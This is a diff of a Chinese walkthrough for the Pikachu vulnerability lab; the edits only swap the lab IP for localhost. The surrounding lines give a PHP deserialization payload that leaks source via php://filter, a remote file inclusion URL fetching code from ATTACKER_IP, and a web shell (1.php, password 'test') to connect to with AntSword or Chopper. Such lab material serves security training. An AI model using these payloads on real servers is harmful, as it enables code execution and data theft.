@@ -63,7 +63,7 @@ if(isset($_GET['test'])){
 
 ### 手工利用流程
 
-假设靶场地址为 `http://192.168.59.1/pikachu/vul/unserilization/unser.php`，参数名为 `test`。
+假设靶场地址为 `http://127.0.0.1/pikachu/vul/unserilization/unser.php`，参数名为 `test`。
 
 #### 步骤 1：生成合法序列化字符串
 
@@ -95,7 +95,7 @@ O:1:"S":1:{s:4:"test";s:61:"php://filter/read=convert.base64-encode/resource=ind
 
 
 ```php
-http://192.168.59.1/pikachu/vul/unserilization/unser.php?test=O%3A1%3A%22S%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dindex.php%22%3B%7D
+http://127.0.0.1/pikachu/vul/unserilization/unser.php?test=O%3A1%3A%22S%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dindex.php%22%3B%7D
 ```
 
 **目的**：对象反序列化成功后，脚本结束时 `__destruct()` 自动执行 `file_get_contents()`，将 `index.php` 的 Base64 编码源码回显到页面。复制回显字符串并解码，即可获得源码。
@@ -188,7 +188,7 @@ if(isset($_POST['submit'])){
 
 ### 手工利用流程
 
-假设靶场地址为 `http://192.168.59.1/pikachu/vul/fileinclude/`。
+假设靶场地址为 `http://127.0.0.1/pikachu/vul/fileinclude/`。
 
 #### 本地包含：路径穿越读取系统文件
 
@@ -245,7 +245,7 @@ include=php://filter/read=convert.base64-encode/resource=fi_local.php&submit=提
 
 
 ```php
-http://192.168.59.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://ATTACKER_IP/hacker.txt&submit=提交
+http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://ATTACKER_IP/hacker.txt&submit=提交
 ```
 
 如果包含成功，远程文件中的 PHP 代码将在目标服务器上执行，`hacker.txt` 被当作 PHP 解析。
@@ -263,7 +263,7 @@ fclose($myfile);
 ?>
 ```
 
-包含该文件后，目标目录下生成 `1.php`，用蚁剑或菜刀连接 `http://192.168.59.1/pikachu/vul/fileinclude/1.php`，密码为 `test`。
+包含该文件后，目标目录下生成 `1.php`，用蚁剑或菜刀连接 `http://127.0.0.1/pikachu/vul/fileinclude/1.php`，密码为 `test`。
 
 #### 本地包含进阶：日志包含 GetShell
 
